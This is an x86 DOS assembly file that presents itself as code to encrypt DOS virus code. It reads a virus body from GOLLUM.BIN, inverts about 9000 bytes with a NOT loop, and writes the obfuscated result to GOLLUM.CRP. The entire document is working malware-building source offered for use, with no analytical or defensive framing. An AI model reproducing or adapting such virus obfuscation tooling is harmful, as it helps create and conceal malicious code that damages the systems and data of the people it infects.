   ; - -[CRYPT.ASM - Code used to encrypt DOS virus code]- - - - - - - - - ->8

   vir_test  segment para 'CODE'
             Assume  cs:vir_test,ds:vir_test,es:vir_test,ss:vir_test
             org 0000h
   Start:
           mov ax,cs
           mov ds,ax
           mov es,ax
           mov ax,3D00h
           mov dx,offset f_name
           int 21h
           jc exit_prog
           xchg bx,ax
           mov ah,3Fh
           mov cx,0FFFFh
           mov dx,offset copy
           int 21h
           jc close_file
           push ax
           mov ah,3Eh
           int 21h
           jc close_file
           mov si,offset copy+0027h
           mov di,si
           mov cx,9000
           cld
   encrypt:
           lodsb
           not al
           stosb
           loop encrypt
           mov ah,3Ch
           xor cx,cx
           mov dx,offset x_name
           int 21h
           jc exit_prog
           xchg bx,ax
           mov ah,40h
           mov dx,offset copy
           pop cx
           int 21h
   close_file:
           mov ah,3Eh
           int 21h
   exit_prog:
           mov ax,4C00h
           int 21h
   f_name  db "GOLLUM.BIN",00h
   x_name  db "GOLLUM.CRP",00h
   copy    db 10000 dup (00h)
   vir_test        ends
                   end Start
